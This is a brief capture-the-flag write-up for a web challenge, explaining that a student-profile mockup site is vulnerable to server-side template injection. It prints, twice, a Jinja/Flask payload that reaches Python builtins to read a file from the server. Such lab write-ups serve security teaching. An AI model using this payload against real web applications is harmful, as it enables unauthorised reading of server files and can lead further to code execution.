# Template generator (Web)

## Description (problem statement)

A student developed this mockup site to create student profiles, but he thinks there is some security breach on it. Try to find it!!

## Summary (solution)

The form fields are vulnerable do SSTI (Server Side Template Injection), as the name suggests.

The flag is in the root directory, as you can find with `{{url_for.__globals__.__builtins__.open('flag.txt').read()}}`

You can get the flag with `{{url_for.__globals__.__builtins__.open('flag.txt').read()}}`
